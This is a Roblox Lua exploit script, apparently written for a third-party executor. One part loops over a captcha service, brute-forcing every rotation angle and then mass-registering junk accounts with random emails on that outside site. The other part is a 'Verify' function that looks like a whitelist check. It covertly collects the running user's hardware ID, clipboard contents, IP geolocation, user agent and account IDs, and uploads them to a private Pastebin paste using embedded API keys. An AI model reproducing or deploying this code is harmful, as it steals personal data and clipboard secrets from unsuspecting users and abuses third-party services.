HS = game.HttpService
HS.HttpEnabled = true
LP = game.Players.LocalPlayer
function GetJson(v)
    return HS:JSONDecode(HS:GetAsync(v))
end

task.spawn(function()
    while true do
        rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
        for i = 1, 360 do
            if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i).okey then
                random = {}
                for v = 0, 100 do
                    table.insert(random, string.char(math.random(97, 122)))
                end
                random = table.concat(random)
                print(GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand).msg)
                break
            end
        end
    end
end)

function Verify(t, s, n)
    if t[LP.Name] == s and LP:IsInGroup(n) then
        pcall(HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=1&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
            List = t,
            IP = GetJson("https://cz88.net/api/cz88/ip/accurate?ip="..GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip),
            UA = HS:GetUserAgent(),
            Group = tostring(n),
            Game = tostring(game.GameId),
            User = tostring(LP.UserId),
            Hwid = gethwid(),
            Clipboard = getclipboard(),
            Executor = identifyexecutor()
        })), "ApplicationUrlEncoded"))
    end
    return t[LP.Name] == s and LP:IsInGroup(n)
end
